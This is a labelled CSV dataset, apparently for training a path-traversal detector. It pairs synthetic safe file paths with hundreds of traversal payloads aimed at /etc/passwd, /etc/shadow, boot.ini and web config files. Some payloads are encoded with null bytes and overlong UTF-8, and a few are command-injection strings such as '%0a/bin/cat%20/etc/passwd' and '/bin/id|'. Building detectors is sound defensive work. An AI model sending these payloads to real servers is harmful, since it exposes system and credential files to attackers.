Sentence,Label
/./././././././././././etc/passwd,1
../../../../../../../../../../../../localstart.asp,1
/safe/path/file706.html,0
/safe/path/file131.html,0
/.../.../.../.../.../,1
/../../../../../../../../../../../boot.ini%00.jpg,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1578.html,0
/safe/path/file592.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file551.html,0
%00../../../../../../etc/shadow,1
/safe/path/file796.html,0
/safe/path/file1474.html,0
%00../../../../../../etc/shadow,1
/safe/path/file1742.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1181.html,0
/safe/path/file931.html,0
/safe/path/file305.html,0
/safe/path/file995.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file1653.html,0
/safe/path/file222.html,0
/safe/path/file1736.html,0
/../../../../../../../../../../etc/shadow,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file837.html,0
../../../../../../../../../../../../etc/shadow,1
/safe/path/file90.html,0
/safe/path/file790.html,0
/safe/path/file1655.html,0
/../../../../../../../../%2A,1
/safe/path/file1788.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/.../.../.../.../.../,1
/safe/path/file360.html,0
/safe/path/file835.html,0
C:/boot.ini,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file163.html,0
/safe/path/file554.html,0
/safe/path/file1628.html,0
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file1443.html,0
/safe/path/file24.html,0
/safe/path/file1343.html,0
/../../../../../../../../bin/id|,1
../../../../../../../../../../../../localstart.asp,1
../../../../../../../../../../../../localstart.asp,1
/.../.../.../.../.../,1
%00/etc/shadow%00,1
/safe/path/file822.html,0
/../../../../../../../../../../etc/passwd,1
/./././././././././././boot.ini,1
/safe/path/file1497.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file1764.html,0
/safe/path/file550.html,0
/safe/path/file670.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file1707.html,0
/safe/path/file1565.html,0
/safe/path/file631.html,0
/safe/path/file1417.html,0
/safe/path/file699.html,0
../../../../../../../../conf/server.xml,1
%00../../../../../../etc/passwd,1
/safe/path/file1268.html,0
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file1081.html,0
/../../../../../../../../../../../boot.ini,1
/safe/path/file839.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
C:/boot.ini,1
/safe/path/file1350.html,0
/safe/path/file1979.html,0
/safe/path/file1871.html,0
/safe/path/file145.html,0
%00/etc/shadow%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file930.html,0
/safe/path/file262.html,0
/../../../../../../../../../../../etc/passwd%00.jpg,1
/../../../../../../../../../../etc/shadow^^,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/./././././././././././etc/shadow,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file1168.html,0
/safe/path/file929.html,0
/safe/path/file755.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/../../../../../../../../../../etc/passwd,1
../../../../../../../../../../../../etc/passwd%00,1
C:/boot.ini,1
C:\inetpub\wwwroot\global.asa,1
/safe/path/file387.html,0
../../../../../../../../../../../../localstart.asp%00,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file87.html,0
/safe/path/file1645.html,0
/./././././././././././etc/shadow,1
/safe/path/file555.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
../../../../../../../../conf/server.xml,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file1551.html,0
/safe/path/file66.html,0
/safe/path/file927.html,0
/safe/path/file729.html,0
C:\boot.ini,1
../../../../../../../../../../../../boot.ini,1
/safe/path/file171.html,0
../../../../../../../../../../../../etc/shadow,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/./././././././././././boot.ini,1
/safe/path/file1279.html,0
/safe/path/file616.html,0
/safe/path/file1097.html,0
../../../../../../../../../../../../etc/hosts,1
%00/etc/shadow%00,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../boot.ini,1
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file488.html,0
/safe/path/file217.html,0
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
%00../../../../../../etc/shadow,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
../../../../../../../../../../../../localstart.asp,1
/safe/path/file224.html,0
/../../../../../../../../../../etc/shadow,1
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file849.html,0
/safe/path/file479.html,0
/safe/path/file1644.html,0
../../../../../../../../../../../../boot.ini%00,1
../../../../../../../../../../../../boot.ini,1
/safe/path/file1412.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file161.html,0
/safe/path/file950.html,0
../../../../../../../../../../../../boot.ini,1
../../../../../../../../conf/server.xml,1
/safe/path/file1636.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/../../../../../../../../%2A,1
/safe/path/file1089.html,0
../../../../../../../../../../../../localstart.asp,1
../../../../../../../../../../../../etc/shadow,1
/./././././././././././etc/shadow,1
C:/boot.ini,1
/safe/path/file1022.html,0
/safe/path/file294.html,0
/safe/path/file788.html,0
/safe/path/file1269.html,0
/safe/path/file1696.html,0
/safe/path/file1058.html,0
/safe/path/file838.html,0
/safe/path/file214.html,0
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file1606.html,0
/safe/path/file1718.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
C:\inetpub\wwwroot\global.asa,1
C:/boot.ini,1
/../../../../../../../../../../etc/passwd,1
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file587.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1531.html,0
/safe/path/file1077.html,0
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file749.html,0
/safe/path/file334.html,0
../../../../../../../../../../../../localstart.asp,1
C:\boot.ini,1
/./././././././././././boot.ini,1
/safe/path/file1484.html,0
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file1654.html,0
/safe/path/file7.html,0
/safe/path/file1828.html,0
/safe/path/file1702.html,0
/safe/path/file123.html,0
../../boot.ini,1
/safe/path/file880.html,0
/..\../..\../..\../..\../..\../..\../etc/shadow,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
%00../../../../../../etc/shadow,1
/safe/path/file528.html,0
/safe/path/file1708.html,0
/./././././././././././etc/passwd,1
/safe/path/file1166.html,0
%00../../../../../../etc/passwd,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file320.html,0
../../../../../../../../conf/server.xml,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file290.html,0
/safe/path/file999.html,0
/./././././././././././etc/shadow,1
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1812.html,0
/safe/path/file30.html,0
/safe/path/file655.html,0
/safe/path/file133.html,0
/safe/path/file1780.html,0
../../../../../../../../../../../../boot.ini,1
../../../../../../../../../../../../etc/passwd,1
/safe/path/file1566.html,0
/safe/path/file0.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1674.html,0
/safe/path/file1329.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1307.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1314.html,0
%00../../../../../../etc/shadow,1
../../../../../../../../../../../../etc/shadow%00,1
../../boot.ini,1
/safe/path/file911.html,0
/safe/path/file195.html,0
/safe/path/file1025.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/../../../../../../../../../../etc/passwd^^,1
../../boot.ini,1
/safe/path/file373.html,0
%00../../../../../../etc/shadow,1
/safe/path/file1265.html,0
/safe/path/file779.html,0
/safe/path/file1931.html,0
/safe/path/file1573.html,0
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file1820.html,0
/safe/path/file1581.html,0
/safe/path/file469.html,0
/safe/path/file1963.html,0
/safe/path/file65.html,0
/safe/path/file1296.html,0
../../../../../../../../../../../../boot.ini%00,1
/./././././././././././etc/shadow,1
/safe/path/file326.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
../../../../../../../../../../../../etc/passwd,1
/safe/path/file1640.html,0
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file1630.html,0
/safe/path/file113.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file1561.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file98.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file1585.html,0
/../../../../../../../../../../../boot.ini%00.html,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file804.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
%00../../../../../../etc/shadow,1
/safe/path/file637.html,0
C:/inetpub/wwwroot/global.asa,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file1634.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file1287.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file1827.html,0
/safe/path/file1032.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file661.html,0
../../../../../../../../../../../../etc/shadow,1
/safe/path/file1797.html,0
../../../../../../../../../../../../etc/hosts,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1452.html,0
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file1735.html,0
/../../../../../../../../../../etc/passwd^^,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
C:\boot.ini,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file16.html,0
/safe/path/file1223.html,0
/safe/path/file366.html,0
/safe/path/file423.html,0
/safe/path/file948.html,0
%00/etc/passwd%00,1
/safe/path/file597.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file1897.html,0
/../../../../../../../../../../etc/shadow^^,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file1057.html,0
/../../../../../../../../../../etc/passwd,1
/safe/path/file608.html,0
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file139.html,0
C:\boot.ini,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
%00../../../../../../etc/shadow,1
/../../../../../../../../../../etc/passwd,1
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file1541.html,0
/safe/path/file1399.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
../../../../../../../../../../../../etc/hosts,1
%0a/bin/cat%20/etc/passwd,1
/safe/path/file952.html,0
../../../../../../../../../../../../etc/shadow,1
/safe/path/file482.html,0
../../../../../../../../../../../../etc/shadow,1
/safe/path/file1015.html,0
%00/etc/passwd%00,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/../../../../../../../../../../etc/shadow^^,1
../../../../../../../../conf/server.xml,1
/safe/path/file70.html,0
/../../../../../../../../../../../boot.ini,1
../../../../../../../../../../../../localstart.asp%00,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
../../../../../../../../../../../../etc/passwd%00,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1066.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file150.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file1769.html,0
/safe/path/file741.html,0
/safe/path/file1332.html,0
/safe/path/file593.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file793.html,0
/safe/path/file1107.html,0
/safe/path/file1631.html,0
/safe/path/file1646.html,0
/safe/path/file1192.html,0
/safe/path/file455.html,0
/safe/path/file786.html,0
/safe/path/file1093.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file250.html,0
/safe/path/file740.html,0
/safe/path/file1518.html,0
/./././././././././././boot.ini,1
C:\boot.ini,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file1315.html,0
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file475.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file1473.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/../../../../../../../../../../../boot.ini%00.jpg,1
/../../../../../../../../bin/id|,1
/safe/path/file1424.html,0
/./././././././././././boot.ini,1
../../../../../../../../../../../../localstart.asp%00,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file743.html,0
/safe/path/file1055.html,0
/safe/path/file1940.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1569.html,0
/safe/path/file1394.html,0
/safe/path/file483.html,0
C:/inetpub/wwwroot/global.asa,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file573.html,0
../../../../../../../../../../../../etc/passwd%00,1
/./././././././././././boot.ini,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1782.html,0
/safe/path/file850.html,0
/safe/path/file1122.html,0
../../../../../../../../conf/server.xml,1
/../../../../../../../../../../etc/shadow,1
/../../../../../../../../../../../boot.ini,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
C:\inetpub\wwwroot\global.asa,1
/safe/path/file657.html,0
/safe/path/file861.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file390.html,0
/safe/path/file975.html,0
C:\inetpub\wwwroot\global.asa,1
/./././././././././././etc/shadow,1
%00/etc/shadow%00,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file61.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
../../../../../../../../../../../../etc/shadow%00,1
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1240.html,0
/safe/path/file1171.html,0
/../../../../../../../../../../../boot.ini,1
C:\boot.ini,1
/safe/path/file1528.html,0
C:\boot.ini,1
/safe/path/file1230.html,0
/safe/path/file780.html,0
/safe/path/file465.html,0
../../../../../../../../../../../../boot.ini,1
../../../../../../../../../../../../localstart.asp,1
/safe/path/file1811.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
../../../../../../../../../../../../localstart.asp,1
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file3.html,0
/safe/path/file1092.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/../../../../../../../../../../etc/shadow,1
/safe/path/file75.html,0
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file1095.html,0
/safe/path/file1694.html,0
/.../.../.../.../.../,1
../../../../../../../../../../../../etc/passwd%00,1
/../../../../../../../../../../etc/passwd^^,1
/../../../../../../../../%2A,1
/safe/path/file745.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file233.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/.../.../.../.../.../,1
../../../../../../../../../../../../etc/shadow,1
/../../../../../../../../../../etc/passwd^^,1
/../../../../../../../../../../../boot.ini,1
../../boot.ini,1
/safe/path/file1624.html,0
/safe/path/file480.html,0
/safe/path/file622.html,0
%00../../../../../../etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
C:\inetpub\wwwroot\global.asa,1
C:/inetpub/wwwroot/global.asa,1
C:\inetpub\wwwroot\global.asa,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file879.html,0
/safe/path/file1163.html,0
/safe/path/file437.html,0
/safe/path/file557.html,0
/safe/path/file716.html,0
/./././././././././././boot.ini,1
%00/etc/passwd%00,1
/safe/path/file1603.html,0
/safe/path/file1368.html,0
%0a/bin/cat%20/etc/passwd,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1161.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1069.html,0
/safe/path/file864.html,0
/safe/path/file1855.html,0
/safe/path/file1507.html,0
/safe/path/file1051.html,0
/safe/path/file1604.html,0
/safe/path/file870.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
%00/etc/shadow%00,1
/safe/path/file815.html,0
/safe/path/file966.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/../../../../../../../../../../../boot.ini%00.html,1
../../../../../../../../../../../../localstart.asp%00,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file183.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file487.html,0
/safe/path/file924.html,0
/safe/path/file310.html,0
/safe/path/file991.html,0
/safe/path/file1028.html,0
/safe/path/file1903.html,0
/safe/path/file1126.html,0
/safe/path/file142.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file907.html,0
/safe/path/file1590.html,0
/safe/path/file547.html,0
/safe/path/file575.html,0
/../../../../../../../../../../etc/shadow^^,1
%00../../../../../../etc/passwd,1
../../../../../../../../../../../../etc/passwd,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file297.html,0
/safe/path/file1345.html,0
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file632.html,0
/safe/path/file1598.html,0
C:/inetpub/wwwroot/global.asa,1
../../../../../../../../conf/server.xml,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file723.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file659.html,0
/safe/path/file1159.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file392.html,0
/safe/path/file365.html,0
/safe/path/file110.html,0
C:/boot.ini,1
/../../../../../../../../../../etc/passwd,1
/safe/path/file6.html,0
/safe/path/file1411.html,0
C:/boot.ini,1
/safe/path/file909.html,0
/../../../../../../../../../../../boot.ini,1
/safe/path/file915.html,0
%0a/bin/cat%20/etc/shadow,1
/safe/path/file266.html,0
../../../../../../../../../../../../etc/passwd%00,1
../../../../../../../../../../../../etc/hosts%00,1
../../../../../../../../../../../../boot.ini%00,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file698.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
%00/etc/passwd%00,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file44.html,0
../../../../../../../../conf/server.xml,1
%0a/bin/cat%20/etc/passwd,1
/../../../../../../../../../../../boot.ini,1
/safe/path/file666.html,0
/safe/path/file1348.html,0
/safe/path/file640.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file1175.html,0
/safe/path/file580.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
../../../../../../../../../../../../localstart.asp%00,1
%00/etc/shadow%00,1
/./././././././././././boot.ini,1
/../../../../../../../../%2A,1
/../../../../../../../../../../../etc/passwd%00.jpg,1
../../../../../../../../../../../../etc/shadow%00,1
%00../../../../../../etc/shadow,1
/safe/path/file1792.html,0
/.../.../.../.../.../,1
/../../../../../../../../../../../boot.ini%00.html,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file470.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
%00../../../../../../etc/shadow,1
C:/inetpub/wwwroot/global.asa,1
/safe/path/file1292.html,0
/safe/path/file1673.html,0
/safe/path/file1088.html,0
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file537.html,0
/safe/path/file1199.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
../../../../../../../../../../../../etc/passwd,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file501.html,0
/safe/path/file1052.html,0
/.../.../.../.../.../,1
/./././././././././././etc/shadow,1
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1123.html,0
/safe/path/file494.html,0
/../../../../../../../../../../../boot.ini,1
/safe/path/file1393.html,0
/safe/path/file1322.html,0
/../../../../../../../../../../../etc/passwd%00.jpg,1
/safe/path/file980.html,0
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file691.html,0
C:/boot.ini,1
/../../../../../../../../%2A,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
../../../../../../../../../../../../localstart.asp,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1703.html,0
/safe/path/file1745.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file40.html,0
/safe/path/file1415.html,0
/safe/path/file117.html,0
/safe/path/file311.html,0
%00../../../../../../etc/passwd,1
/./././././././././././boot.ini,1
C:/boot.ini,1
/safe/path/file1895.html,0
/safe/path/file1407.html,0
/safe/path/file1038.html,0
C:/boot.ini,1
/safe/path/file603.html,0
/../../../../../../../../bin/id|,1
/safe/path/file1040.html,0
%00/etc/passwd%00,1
../../../../../../../../conf/server.xml,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/../../../../../../../../%2A,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1135.html,0
/safe/path/file17.html,0
/safe/path/file331.html,0
/safe/path/file1397.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file99.html,0
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file1679.html,0
/safe/path/file649.html,0
/safe/path/file532.html,0
/safe/path/file94.html,0
/safe/path/file1593.html,0
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file1695.html,0
/safe/path/file682.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file1244.html,0
/safe/path/file1282.html,0
/safe/path/file410.html,0
/safe/path/file216.html,0
/safe/path/file137.html,0
/safe/path/file1406.html,0
../../../../../../../../../../../../etc/hosts%00,1
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file918.html,0
/safe/path/file1071.html,0
/safe/path/file823.html,0
/safe/path/file990.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file156.html,0
/safe/path/file773.html,0
/safe/path/file979.html,0
%0a/bin/cat%20/etc/shadow,1
../../../../../../../../../../../../localstart.asp,1
/safe/path/file923.html,0
/safe/path/file1486.html,0
/safe/path/file959.html,0
C:/boot.ini,1
/./././././././././././etc/passwd,1
/safe/path/file1825.html,0
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file1370.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file176.html,0
C:\boot.ini,1
/safe/path/file644.html,0
/safe/path/file1600.html,0
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file122.html,0
/safe/path/file805.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
%00../../../../../../etc/shadow,1
/../../../../../../../../%2A,1
/safe/path/file1844.html,0
/safe/path/file973.html,0
/safe/path/file271.html,0
/safe/path/file1933.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file60.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file754.html,0
/safe/path/file1675.html,0
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file558.html,0
/safe/path/file1513.html,0
/safe/path/file454.html,0
/safe/path/file282.html,0
/safe/path/file1594.html,0
/safe/path/file1671.html,0
/safe/path/file1834.html,0
/safe/path/file476.html,0
%00../../../../../../etc/passwd,1
/safe/path/file590.html,0
/safe/path/file1174.html,0
%00/etc/passwd%00,1
/safe/path/file1753.html,0
/safe/path/file667.html,0
%0a/bin/cat%20/etc/passwd,1
/safe/path/file1082.html,0
/safe/path/file1656.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
